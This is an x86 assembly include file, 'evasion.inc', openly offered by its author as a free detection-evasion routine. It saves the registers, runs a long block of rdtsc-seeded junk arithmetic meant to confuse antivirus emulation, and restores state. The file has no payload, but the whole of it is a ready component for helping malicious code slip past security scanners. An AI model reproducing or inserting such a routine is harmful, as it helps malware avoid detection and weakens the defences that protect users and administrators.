;evasion.inc
;made by Skovoroda
;free for anyone
evade:
pushfd
push edi
push esi
push ebp
push edx
push ecx
push ebx
push eax
sub esp, 4
lea esi, [esp]
lea edi, [esp]
mov eax, 228
mov ebx, 1488
mov edx, 333
xor eax, ebx
xchg edx, ebx
mov edx, 88
add eax, 55
sub ebx, edx
xchg eax, ebp
xor edx, edx
div ebp
imul ebp, ebx
xchg ebx, ebp
rdtsc
xor eax, edx
mov ebx, eax
neg ebx
rol eax, 5
add ebx, eax
bswap eax
mov edx, 7fffffffh
and eax, edx
add eax, ebx
sub edx, eax
adc eax, edx
and ah, bh
adc ch, [edi]
adc bl, ch
and [esi], cl
or dl, ch
adc ah, bl
sub [esi], al
adc [esi], dl
and cl, ch
and bh, cl
and [esi], cl
and bh, cl
and bh, cl
and bh, cl
and [esi], cl
and bh, cl
adc dh, bh
xor ebx, ecx
cmp al, 0BBh
and [esi], cl
sub ch, bl
cmp al, 0B2h
sub ebp, ebx
sbb ebx, ebx
cmp al, 0B2h
cmp ebx, edx
and ah, ah
add al, 0D8h
mov ch, 23h
sbb bl, dl
mov ch, 0F6h
or bl, cl
add bl, al
cmp ebx, eax
and ah, dl
mov eax, 2FFF8646h
adc ah, bl
mov bh, 0F6h
or ch, dl
mov cl, 33h
cmp al, 0E2h
inc ebx
and ah, dl
mov ch, 0FAh
adc dl, dl
xor esi, ecx
lea esi, [esp]
and [esi], al
or cl, dl
add al, 0BBh
sub cl, bh
and [esi], cl
or cl, dl
or cl, dl
mov al, 91h
and [esi], cl
mov al, 0B5h
sub cl, bh
and ch, dl
add al, 0E5h
or dl, cl
mov dl, 5Ch
mov bh, 3Dh
mov ch, 0Bh
mov al, 0DCh
and [esi], cl
mov bh, 0A9h
or ch, dl
mov al, 0A3h
sbb ebx, ebp
cmp ch, dl
and [esi], cl
mov bh, 2Bh
add bl, cl
mov di, 1B7Fh
or cl, dl
add ah, cl
mov ch, 0F6h
and [esi], cl
mov ch, 74h
or cl, dl
add bl, cl
sub ecx, ebp
cmp ax, 14C6h
and ch, dl
add al, 0DBh
inc ebx
and [esi], cl
mov bh, 11h
mov dl, 0C8h
mov dl, 0D4h
mov bh, 91h
adc dl, bh
and [esi], cl
mov ebx, 04C5B3D2h
and [esi], cl
mov ch, 0AEh
or ch, dl
mov bh, 09Bh
mov al, 57h
mov dl, 2Bh
mov al, 8Dh
and [esi], cl
cmp [esi], cl
mov bh, 87h
and [esi], cl
or cl, dl
mov ch, 74h
or dl, cl
mov bh, 53h
or ch, dl
mov dl, 85h
and [esi], cl
mov cl, 2Bh
inc ebx
mov ch, 8Ch
and ah, dl
mov bh, 0C8h
and ch, dl
add al, 1Bh
cmp [esi], cl
mov bh, 0C7h
or dl, cl
add bl, dl
or ch, dl
mov bh, 88h
or ch, dl
mov bh, 24h
or ch, dl
and [esi], cl
and bh, cl
mov ebx, 0F4C48D35h
mov ch, 1Ch
add eax, 0B4DB001Ch
and [esi], cl
add esp, 4
pop eax
pop ebx
pop ecx
pop edx
pop ebp
pop esi
pop edi
popfd
ret
